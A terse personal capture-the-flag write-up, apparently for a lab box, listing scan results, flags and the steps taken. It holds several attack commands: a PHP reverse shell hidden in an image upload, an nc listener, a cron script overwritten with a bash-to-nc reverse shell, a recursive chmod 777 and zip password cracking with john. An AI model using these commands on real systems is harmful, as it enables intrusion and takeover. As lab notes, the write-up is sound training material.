# CarMaster Cyberwars CTF 

- nmap scan: port ip.100 port 80,22 


1st flag:
- While trying to analyze the files in sell.php: flag{7h47_w45_345y_r16h7?}

2nd flag:

- magic bytes have to match so:
- `cat revshell.php >> cat.jpeg.php` 
- `nc -lvnp 9001`
- on sell page upload modified image
- flag{4lw4y5_v4l1d473_upl04d3d_c0n73n7!}


meanwhile general stuff found:

- in /var/www: do_backup.sh (franklin has full rights, other can write but not read, wtf?)
- linpeas not very fruitfull
- grep didn't show anything with do_backup 
- systemlink to do_backup is not allowed
- all franklin files are read only
- actually useful stuff: 
- cronjob executes do_backup.sh - we have write access to it 
- `echo "cat /tmp/f | /bin/bash -i 2>&1 | nc 10.0.2.4 4444 > /tmp/f" > do_backup.sh`
- nah fuck this shit, just 
- `chmod -R 777 /home/franklin`
- flag{ch3ck_f1l3_p3rm15510n5!}
- read chat_backup.txt
- `python3 -m http.server 8080`
- `curl 10.0.2.100:8080/information.zip --output information.zip`
- `zip2john information.zip > hash`
- `john hash` -> pw: PASSWORD1
- unzip it
- pcap file
- I hate searching with wireshark





